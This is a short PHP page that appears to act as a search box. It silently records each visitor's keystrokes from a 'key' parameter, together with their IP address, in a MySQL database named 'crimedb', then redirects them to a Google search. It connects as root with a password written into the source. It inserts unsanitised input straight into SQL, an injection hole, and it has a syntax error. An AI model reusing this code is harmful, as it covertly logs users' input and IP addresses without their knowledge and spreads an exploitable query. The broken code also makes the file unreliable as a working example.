<!DOCTYPE html>
<html>
    <head>

    </head>
    <body>
        <?php 
            
            $server = "localhost";
            $user_db = "root";
            $pass_db = "Th15MyCl@nk3r";
            $db = "crimedb";

            $conn = mysqli_connect($server, $user_db, $pass_db, $db);
            
            if (!$conn) {
                die("<h1> Connection failed </h1>");
            }

            $keystrokes = trim($_GET["key"]);
            $full_search = trim($_GET["searchquery"]);
            $ip = $_SERVER["REMOTE_ADDR"];


            $sql = "INSERT INTO ipAndQuery (letter, ipaddr)
                    VALUES ('$keystrokes', '$ip')"; // table ipAndQuerry with columns letter and ipaddr

            if (mysqli_query($conn, $sql)) {
                header("Location: https://google.com/search?q=$full_search")
            }

            mysqli_close($conn);
        ?>
    </body>
</html>